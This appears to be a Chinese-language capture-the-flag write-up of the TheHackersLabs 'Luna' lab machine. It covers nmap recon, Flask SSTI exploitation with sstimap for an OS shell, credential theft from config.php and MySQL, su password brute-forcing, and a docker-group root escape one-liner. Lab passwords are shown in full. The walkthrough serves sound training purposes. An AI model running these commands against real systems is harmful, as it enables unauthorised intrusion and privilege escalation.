postData.contentHtml:
Luna

https://labs.thehackerslabs.com/machine/53

Recon

PortScan

现在不知道为什么我的 nmap 总是会扫出来 25 和 110 端口

➜  Luna nmap -sT -min-rate 10000 -p- 192.168.56.133
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-28 15:49 CST
Nmap scan report for 192.168.56.133
Host is up (0.00085s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE
25/tcp   open  smtp
80/tcp   open  http
110/tcp  open  pop3
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 39.52 seconds

➜  Luna nmap -sT -A -p 25,80,110,5000 192.168.56.133
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-28 15:50 CST
Nmap scan report for 192.168.56.133
Host is up (0.00054s latency).

PORT     STATE SERVICE    VERSION
25/tcp   open  tcpwrapped
|_smtp-commands: Couldn't establish connection on port 25
80/tcp   open  http       Apache httpd 2.4.58
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.58 (Ubuntu)
110/tcp  open  tcpwrapped
5000/tcp open  http       Werkzeug httpd 3.0.3 (Python 3.12.3)
|_http-server-header: Werkzeug/3.0.3 Python/3.12.3
|_http-title: RodGar
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: WAP|general purpose
Running: Actiontec embedded, Linux 2.4.X
OS CPE: cpe:/h:actiontec:mi424wr-gen3i cpe:/o:linux:linux_kernel cpe:/o:linux:linux_kernel:2.4.37
OS details: Actiontec MI424WR-GEN3I WAP, DD-WRT v24-sp2 (Linux 2.4.37)
Network Distance: 2 hops
Service Info: Host: 192.168.56.133

TRACEROUTE (using proto 1/icmp)
HOP RTT     ADDRESS
1   0.33 ms 192.168.111.2
2   0.43 ms 192.168.56.133

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.33 seconds

枚举

80 端口

5000 端口

SSTI

点击 Greet me 报错了，并且能知道调试已经开了

信息类型 详细信息 意义
框架/语言 Python 3.12, Flask, Werkzeug 目标是一个标准的 Python Web 应用。
文件路径 /var/www/RODGAR/venv/lib/python3.12/... 泄露了应用程序的部署路径。RODGAR 可能是项目名称、用户名或服务名。
主要应用文件 /var/www/RODGAR/app.py 确定了主应用文件的位置和名称。
调试模式 调试器显示 (Traceback) 服务器处于调试模式（通常生产环境不会开启），这提供了代码执行细节。
错误类型 werkzeug.exceptions.BadRequestKeyError: 400 Bad Request 客户端发送了错误的请求，服务器无法找到所需的键。
缺失的键 KeyError: 'name' 应用程序在处理请求时，期望找到名为 name 的参数，但未能找到。

从上面的信息能知道我们缺少 name 参数，并且将错误展开后会看到上下文代码，从中发现下面这段代码存在 SSTI

name = request.form['name']
template = f'''
<DOCTYPE html>
... (HTML content)
'''

测试 SSTI

存在 SSTI 我们直接上 sstimap

python sstimap.py -u 'http://192.168.56.133:5000/greet' -m POST -d 'name=*'

我们指定 --os-shell 即可拿到 shell

然后进行反弹 shell 即可

横向移动

To juan

当前目录下存在 config.php ，却明明是 python 应用

www-data@TheHackersLabs-Luna:~/RODGAR$ cat config.php
cat config.php
<?php
$servername = "localhost";
$username = "admin";
$password = "sporting";
$dbname = "rodgar";

// Crear conexión
$conn = new mysqli($servername, $username, $password, $dbname);

// Verificar conexión
if ($conn->connect_error) {
    die("Conexión fallida: " . $conn->connect_error);
}
?>

成功登录进去

www-data@TheHackersLabs-Luna:~/RODGAR$ mysql -u admin -p
mysql -u admin -p
Enter password: sporting

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 9
Server version: 8.0.39-0ubuntu0.24.04.1 (Ubuntu)

Copyright (c) 2000, 2024, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>

存在 juan 用户的凭据，还有加密密码

mysql> select * from user;
select * from user;
+-------+----------------------------------+
| users | password                         |
+-------+----------------------------------+
| juan  | YzBvW1VrbU0yTVRSVGU4QGpOLk0oOWIK |
+-------+----------------------------------+
1 row in set (0,01 sec)

看着像是 base64 而不是 md5，通过 base64 能解密出来

c0o[UkmM2MTRTe8@jN.M(9b

juan 用户能读取 user.txt

juan@TheHackersLabs-Luna:~$ cat user.txt
cat user.txt
a81xxxxxxxxxxxxxxxxxxxxxxxxxx0

To jose

juan 家目录下还存在 password.txt

juan@TheHackersLabs-Luna:~$ cat pas
cat password.txt 
Tr0ub4dor&3
M0nkey!2024
L3tMeIn@2024
S3cur3P@ssw0rd
P@ssw0rd1234
G00dP@ssw0rd!
R3liable#2024
W1nter$2024
H@ppyD@y#1
4U&Me2Day!
B3stS3cur!ty
F1rst&Last@2024

再看家目录下有几个用户，还有 carmen、jose、john

juan@TheHackersLabs-Luna:~$ ls /home
carmen  john  jose  juan

通过 suForce 来进行爆破

得到用户 jose 的密码 W1nter$2024

To root

拥有 docker 权限

jose@TheHackersLabs-Luna:~$ id
id
uid=1002(jose) gid=1002(jose) groups=1002(jose),111(docker)

结束了，这里需要有网络获取镜像才行

sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
postData.title: TheHackersLabs - Luna
postData.description: Luna https://labs.thehackerslabs.com/machine/53 Recon PortScan 现在不知道为什么我的 nmap 总是会扫出来 25 和 110 端口 枚举 80 端口 5000 端口 SSTI 点击 Greet me 报错了，并且能知道调试已经开了 |...
